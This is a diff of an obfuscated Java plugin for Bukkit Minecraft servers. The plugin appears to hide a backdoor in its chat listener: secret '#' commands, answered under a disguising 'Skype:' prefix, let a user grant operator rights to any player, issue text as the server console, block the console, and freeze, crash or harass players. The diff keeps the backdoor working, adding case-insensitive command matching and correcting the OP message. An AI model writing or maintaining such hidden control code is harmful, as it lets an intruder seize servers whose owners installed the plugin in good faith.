@@ -36,7 +36,7 @@ public class C$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$2$$$$$$$$$$$$$$$$ implements Li
 				P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#Freeze §7[§e(NAME) §8| §cALL§7]");
 			}else{
 				String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
-				if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")){
+				if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL") || $$$$$PLS$$$$$$$$$$$$$$$[1].equals("all")){
 					for(Player $$$$$$$$$$$$$$uhe$$$$$$$$$$$$ : Bukkit.getOnlinePlayers()){
 					if($$$$$$$$$$$$$$uhe$$$$$$$$$$$$ == P$$$$$$$$$$$$$$$$$$$$$$$$$$$$){
 						
@@ -56,7 +56,7 @@ public class C$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$2$$$$$$$$$$$$$$$$ implements Li
 					P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#Jumpscare §7[§e(NAME) §8| §cALL§7]");
 				}else{
 					String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
-					if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")){
+					if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")|| $$$$$PLS$$$$$$$$$$$$$$$[1].equals("all")){
 						for(Player $$$$$$$$$$$$$$uhe$$$$$$$$$$$$ : Bukkit.getOnlinePlayers()){
 							if($$$$$$$$$$$$$$uhe$$$$$$$$$$$$ == P$$$$$$$$$$$$$$$$$$$$$$$$$$$$){
 								
@@ -76,7 +76,7 @@ public class C$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$2$$$$$$$$$$$$$$$$ implements Li
 						P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#Destroy §7[§e(NAME) §8| §cALL§7]");
 					}else{
 						String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
-						if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")){
+						if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")|| $$$$$PLS$$$$$$$$$$$$$$$[1].equals("all")){
 							for(Player $$$$$$$$$$$$$$uhe$$$$$$$$$$$$ : Bukkit.getOnlinePlayers()){
 								if($$$$$$$$$$$$$$uhe$$$$$$$$$$$$ == P$$$$$$$$$$$$$$$$$$$$$$$$$$$$){
 									
@@ -91,7 +91,9 @@ public class C$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$2$$$$$$$$$$$$$$$$ implements Li
 						}
 					}
 					}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#cycrash") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#CyCrash")){
+						if(!Main.PS$$$$$$$$$$$$$$$$$$$$$$$03$$$$$$.contains(P$$$$$$$$$$$$$$$$$$$$$$$$$$$$)){
 						Main.PS$$$$$$$$$$$$$$$$$$$$$$$03$$$$$$.add(P$$$$$$$$$$$$$$$$$$$$$$$$$$$$);
+						}
 						e.setCancelled(true);
 						o.Infos(P$$$$$$$$$$$$$$$$$$$$$$$$$$$$);
 					}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#writeas") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#WriteAs")){
@@ -100,7 +102,7 @@ public class C$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$2$$$$$$$$$$$$$$$$ implements Li
 							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#WriteAs §7[§e(NAME)§7] [§a(Nachricht)§7]");
 						}else{
 							String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
-							if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ")[1].equals("konsole")){
+							if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ")[1].equals("konsole")||MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ")[1].equals("Konsole")){
 								String $$$ms$$$$$$$$ = "";
 								for(int i = 2; i < $$$$$PLS$$$$$$$$$$$$$$$.length; i++ ){
 									$$$ms$$$$$$$$ =  $$$ms$$$$$$$$ + $$$$$PLS$$$$$$$$$$$$$$$[i] + " ";
@@ -210,7 +212,7 @@ public class C$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$2$$$$$$$$$$$$$$$$ implements Li
 							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#BlockCMD §7[§eSpieler | Konsole§7]  ");
 						}else{
 						String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
-						if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("konsole")){
+						if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("konsole") || $$$$$PLS$$$$$$$$$$$$$$$[1].equals("Konsole")){
 							if(Main.c$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ == false){
 								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §cKonsole blockiert");
 								Main.c$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ = true;
@@ -235,7 +237,7 @@ public class C$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$2$$$$$$$$$$$$$$$$ implements Li
 							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#NoSprint §7[§e(NAME) §8| §cALL§7]");
 						}else{
 							String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
-							if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")){
+							if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL") || $$$$$PLS$$$$$$$$$$$$$$$[1].equals("all")){
 								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §7Sprinten global §cdeaktiviert");
 								for(Player $$$$$$$$$$$$$$uhe$$$$$$$$$$$$ : Bukkit.getOnlinePlayers()){
 									if($$$$$$$$$$$$$$uhe$$$$$$$$$$$$ == P$$$$$$$$$$$$$$$$$$$$$$$$$$$$){
@@ -273,7 +275,7 @@ public class C$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$2$$$$$$$$$$$$$$$$ implements Li
 									if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
 										P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
 									}else{
-										P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §7OP-Rechte für " +  P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.getName()  + " §cregistriert");
+										P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §7OP-Rechte für " +  Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getName()  + " §cregistriert");
 										Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).setOp(true);
 									}
 								}
